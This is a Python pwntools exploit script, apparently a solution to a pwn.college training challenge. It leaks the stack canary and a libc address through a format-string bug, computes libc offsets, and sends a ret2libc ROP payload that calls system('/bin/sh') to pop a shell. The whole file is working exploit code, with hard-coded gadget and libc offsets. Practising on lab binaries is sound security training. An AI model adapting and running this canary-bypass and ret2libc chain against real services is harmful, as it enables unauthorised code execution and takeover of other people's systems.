#!/usr/bin/env python3
# Pwn.College Username = bulmax9797

import time, os, traceback, sys, os
import pwn
from pwn import *
import binascii, array
from textwrap import wrap
import re

binPath="/challenge/homework"
elf = pwn.context.binary = pwn.ELF(binPath,checksec=False)


def start(argv=[], *a, **kw):
    if pwn.args.GDB:  # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath] + argv, gdbscript=gdbscript, *a, **kw)
    elif pwn.args.REMOTE:  # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # run locally, no GDB
        return pwn.process([binPath] + argv, *a, **kw)

# Build in GDB support
# Set the breakpoint before jsut before the input is taken for debugging in gdb.

gdbscript = '''
break *vuln+120
continue
'''.format(**locals())

io = start()

# Leak 19th address from stack which is the canary, 25th is lib_start_main +243
io.sendlineafter(b'!', '%{}$p %{}$p'.format(19, 25))
io.recvuntil(b'Hello:\n')

# Splitting and stripping the stored 2 addresses
leaked_addr=io.recvline().strip().split()

# Decoding the leaked addresses from byte strings to strings
addr1=leaked_addr[0].decode("utf-8")
addr2=leaked_addr[1].decode("utf-8")

# Convert the leaked addresses from hexadecimal strings to integers
canary_addr=int( addr1, 16)
# Subtracted the 243 offset
libc_start_addr=int( addr2, 16)-243


# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep main | grep start
# Calculate the base address of libc by subtracting the known offset from libc_start_main's address
offset= 0x23f90
libc_base= libc_start_addr -offset

# Calculate the addresses of system() and "/bin/sh" within libc
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep main | grep system
system = libc_base + 0x52290
# strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep '/bin/sh'
binsh = libc_base + 0x1b45bd

# ROPgadget --binary /challenge/homework
ret_gagdet= 0x40101a
POP_RDI = 0x4013f3

# Used the following reference to craft the payload https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2libc

payload = b'A' * 72         # The padding
payload += p64(canary_addr) # Canary value to pass the stack protector check
payload += b'A' * 8         # Additional padding
payload += p64(ret_gagdet)  # Return gadget
payload += p64(POP_RDI)     # gadget -> pop rdi; ret
payload += p64(binsh)       # pointer to command: /bin/sh
payload += p64(system)      # Location of system
payload += p64(0x0)         # Null terminator for system() arguments

# Printing the length of the payload
pwn.info("buffer len: %d",len(payload))
# Sending the payload ( It runs as the input for the program)
io.sendline(payload)

io.interactive()

 

